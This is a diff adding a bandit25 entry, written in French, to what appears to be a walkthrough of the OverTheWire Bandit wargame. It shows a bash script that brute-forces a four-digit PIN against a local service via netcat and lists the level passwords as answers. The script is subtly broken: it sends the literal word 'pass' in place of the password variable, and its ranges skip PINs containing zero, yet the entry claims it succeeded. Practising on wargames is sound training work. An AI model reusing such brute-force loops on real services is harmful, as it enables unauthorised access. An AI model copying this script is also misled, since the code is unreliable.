@@ -166,5 +166,15 @@ donc je cree un fichier dans le /tmp
 apres quelque seconde le pass est dans pass.txt
 >cat pass.txt bandit24 : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
 ```
+# bandit25
+```
+#!/bin/bash
+pass='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
+for i in {1..9}{1..9}{1..9}{1..9}
+do
+    echo pass $i |nc localhost 30002;
+done
+>>> bandit25 : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
 
 
